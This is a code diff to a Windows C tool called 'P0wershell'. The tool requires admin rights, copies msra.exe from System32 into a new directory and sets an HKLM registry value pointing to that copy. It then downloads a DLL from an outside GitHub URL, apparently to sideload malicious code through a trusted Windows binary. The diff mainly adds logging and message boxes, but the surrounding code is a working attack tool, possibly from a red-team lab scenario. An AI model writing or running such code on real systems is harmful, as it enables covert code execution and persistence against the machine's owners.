@@ -9,17 +9,26 @@
 
 BOOL WINAPI IsUserAnAdmin(void);
 
-static void press_exit(int code) {
-    printf("\n[=] P0wershell exiting (%d). Press any key to close...\n", code);
-    Sleep(200);
-    _getch();
+static void log_msg(const char* msg) {
+    FILE* f = fopen("C:\\p0wershell.log", "a");
+    if (f) { fprintf(f, "%s\n", msg); fclose(f); }
+}
+
+static void press_exit(int code, const char* why) {
+    char buf[256];
+    snprintf(buf, sizeof(buf), "P0wershell exiting (%d)\n%s", code, why ? why : "");
+    log_msg(buf);
+    MessageBoxA(NULL, buf, "P0wershell", MB_OK | MB_ICONINFORMATION);
     exit(code);
 }
 
 int main(void) {
+    DeleteFileA("C:\\p0wershell.log");
+    log_msg("[+] P0wershell started");
+
     if (!IsUserAnAdmin()) {
         printf("[-] Not running as admin.\n");
-        press_exit(1);
+        press_exit(1, "[-] Not running as admin.");
     }
 
     char path[MAX_PATH];
@@ -75,16 +84,18 @@ int main(void) {
         int hr = SHCreateDirectoryExA(NULL, targetDir, NULL);
         if (hr != ERROR_SUCCESS && hr != ERROR_ALREADY_EXISTS) {
             printf("[-] Failed to create directory (0x%lx)\n", hr);
-            press_exit(1);
+            press_exit(1, "[-] Failed to create target directory.");
         }
     }
     printf("[+] Directory created: %s\n", targetDir);
+    log_msg("[+] Target directory ready");
 
     if (!CopyFileA("C:\\Windows\\System32\\msra.exe", targetMsra, FALSE)) {
         printf("[-] Failed to copy msra.exe (%lu)\n", GetLastError());
-        press_exit(1);
+        press_exit(1, "[-] Failed to copy msra.exe.");
     }
     printf("[+] msra.exe copied\n");
+    log_msg("[+] msra.exe copied");
 
     HKEY hKey;
     LONG regRet = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
@@ -92,11 +103,12 @@ int main(void) {
         0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
     if (regRet != ERROR_SUCCESS) {
         printf("[-] Failed to open registry key (%ld)\n", regRet);
-        press_exit(1);
+        press_exit(1, "[-] Failed to set registry key.");
     }
     RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)targetMsra, lstrlenA(targetMsra) + 1);
     RegCloseKey(hKey);
     printf("[+] Registry key set\n");
+    log_msg("[+] Registry key set");
 
     const char *dllBaseUrl = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main";
     char dllUrl[MAX_PATH];
@@ -130,5 +142,5 @@ int main(void) {
     printf("Press 'q' to exit\n");
     Sleep(200);
     while (_getch() != 'q') {}
-    press_exit(0);
+    press_exit(0, "[+] P0wershell completed.");
 }
